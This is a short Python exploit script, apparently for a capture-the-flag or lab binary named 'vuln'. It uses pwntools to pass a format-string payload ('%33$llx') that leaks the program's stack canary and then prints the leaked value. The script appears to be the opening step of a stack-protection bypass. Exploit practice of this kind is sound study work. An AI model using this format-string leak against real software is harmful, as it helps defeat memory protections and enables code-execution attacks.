#!/usr/bin/python3

from pwn import *
from struct import pack

exe = context.binary = ELF('./vuln')

print("[+] Spwaning process...")

io = process([exe.path, "%33$llx"])
canary = int(io.readline().strip(), 16)

print("[+] Canary leaked: {}".format(hex(canary)))